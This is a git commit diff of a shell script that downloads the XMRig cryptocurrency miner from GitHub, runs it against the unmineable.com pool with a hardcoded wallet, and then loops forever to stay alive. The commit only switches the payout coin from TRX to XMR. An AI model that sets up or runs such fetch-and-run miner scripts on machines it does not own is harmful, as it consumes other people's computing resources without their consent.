d87c34e7c88280acaaa133e691e4fdfdf4c75ba2
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 15:08:33 -0300

    Update x3.sh

--- x3.sh
+++ x3.sh
@@ -4,7 +4,7 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
 tar xf xmrig-6.14.0-linux-x64.tar.gz
 cd xmrig-6.14.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.miner1 -p x --cpu 4
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.miner1 -p x --cpu 4
 while [ 1 ]; do
 sleep 3
 done
